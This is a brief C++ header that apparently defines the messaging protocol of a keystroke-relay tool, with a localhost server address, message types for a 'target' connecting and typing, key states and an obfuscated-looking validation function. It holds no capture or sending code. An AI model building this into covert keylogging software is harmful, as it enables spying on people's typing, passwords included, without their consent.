#pragma once

#include <cstdint>

inline const char* server_ip = "localhost";
inline uint16_t server_port = 60000;

enum class messageType : uint8_t
{
    targetConnected,
    targetDisconnected,
    clientConnected,
    clientDisconnected,
    targetTyped,
    targetCapsStatus
};

enum class keyStatus : uint8_t
{
    keyUp,
    keyDown
};

inline uint64_t validation_function(uint64_t input)
{
    auto out = input ^ 0x5A9B6C2F0F011;
    out = (out & 0xF0F0F0F0F0F0F0) >> 4;
    return out;
}